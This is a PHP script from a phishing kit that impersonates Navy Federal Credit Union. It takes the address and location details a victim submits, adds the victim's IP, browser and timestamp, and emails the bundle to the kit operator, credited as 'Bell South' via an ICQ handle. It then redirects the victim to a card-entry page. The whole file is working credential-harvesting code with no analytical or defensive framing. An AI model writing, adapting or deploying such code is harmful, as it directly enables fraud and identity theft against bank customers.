<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->Navy Federal - ReZulT (6)<------------------\n";
$message .= "Home Address: ".$_POST['Address1']."\n";
$message .= "Billing Address: ".$_POST['Address2']."\n";
$message .= "City: ".$_POST['City']."\n";
$message .= "State: ".$_POST['State']."\n";
$message .= "Postal: ".$_POST['Postal']."\n";
$message .= "Country: ".$_POST['Country']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "From: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By Bell South - ICQ:@Bell_South----------\n";

$subject = "NavyFederal Billing (6)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "Bell South ReZulT ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {

		   header("Location:card3.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 